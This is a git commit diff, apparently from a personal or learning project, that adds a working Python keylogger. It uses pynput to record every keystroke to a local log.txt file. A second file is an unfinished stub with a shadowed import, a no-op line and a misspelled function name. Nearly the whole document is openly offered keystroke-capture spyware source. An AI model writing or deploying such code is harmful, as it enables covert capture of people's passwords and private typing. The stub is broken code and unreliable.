882f33f475951e683f36bdb9a4696a258050ec96
bianca <biancagutierrez121212@gmail.com>
2025-08-19 20:47:35 -0500

    keylogger updated

--- KeyLogger/KeyLogger.py
+++ KeyLogger/KeyLogger.py
@@ -1,1 +1,26 @@
+#--------------------------------------------#
+#                 -keylogger-                #
+#                                            #
+#     Goal of the keylogger is to store      # 
+#     keystrokes of the user                 #
+#     in a text file                         #
+#                                            #
+#--------------------------------------------#
 
+#import pynput to monitor keystrokes
+from pynput.keyboard import Listener
+
+#Defining write to a file by the press of a key
+def writetofile(key):
+
+    #assigns keydata with the string key
+    keydata = str(key)
+    #open the log txt file and appends new data to file
+    with open("log.txt", "a") as f:
+        f.write(keydata)
+
+#listen monitors key input and joins
+with Listener(writetofile) as l:
+    l.join()
+    
+    
---
+++ KeyLogger/keystrokes.py
@@ -0,0 +1,18 @@
+from pynput import keyboard
+from pynput.mouse import Button, Controller
+from pynput.keyboard import Key, Controller
+
+
+
+#This code will use pynput which will allow the keystrokes
+#to be monitored and logged into a txt file
+
+def controlMouse():
+    mouse = Controller()
+
+    mouse.position
+
+
+def constrollKey():
+    keyboard = Controller()
+
